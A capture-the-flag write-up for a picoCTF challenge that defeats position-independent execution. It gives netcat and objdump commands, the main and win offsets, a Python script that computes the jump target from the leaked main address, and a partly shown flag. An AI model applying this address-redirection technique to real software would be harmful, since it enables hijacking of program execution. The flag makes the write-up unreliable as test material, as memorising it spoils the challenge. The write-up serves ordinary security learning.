# Description

Can you try to get the flag? Beware we have PIE!
Connect to the program with netcat:
`$ nc rescued-float.picoctf.net 59193`
The program's source code can be downloaded here. The binary can be downloaded here.

# Solution

`wget https://challenge-files.picoctf.net/c_rescued_float/2736a730340dbe9969fe3104da0cca0c60eddaf1fedb0e220b5df5a3f3cf015f/vuln.c https://challenge-files.picoctf.net/c_rescued_float/2736a730340dbe9969fe3104da0cca0c60eddaf1fedb0e220b5df5a3f3cf015f/vuln`

After connecting with `nc rescued-float.picoctf.net 59193` you will see an output something like this:

```
Address of main: 0x6234ec90433d
Enter the address to jump to, ex => 0x12345: 
```

Of course, you can see this behavior as well through vuln.c without running it, but near the end, you'll need to run it for the address of main.

The address of main will change with each run, so it may be a good idea to run two separate terminals, one for running the script and the other for keeping the netcat connection. Alternatively, you can use some other method of compiling the Python script later on.

To get the offsets you can use objdump on the vuln executable: Either `objdump -D vuln | less` or `objdump -D vuln > data.txt`

Once you have that you can search or grep for win and main:

`00000000000012a7 <win>:`

0x12a7

`000000000000133d <main>:`

0x133d

After you have those values you can write a simple Python script with the offsets:

```
main_address = int(input("Enter the main address: "), 16)
main_offset = 0x133d
win_offset = 0x12a7
win_address = main_address - main_offset + win_offset

print("Win address:", win_address)
```

Once you have this information you can run the netcat in one terminal to get the address of main and then in another terminal use that address in the script. On each iteration, the offsets and address will change. Once you have the win address from the script you can input that into the netcat connection and get the flag.

Flag: `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc...}`
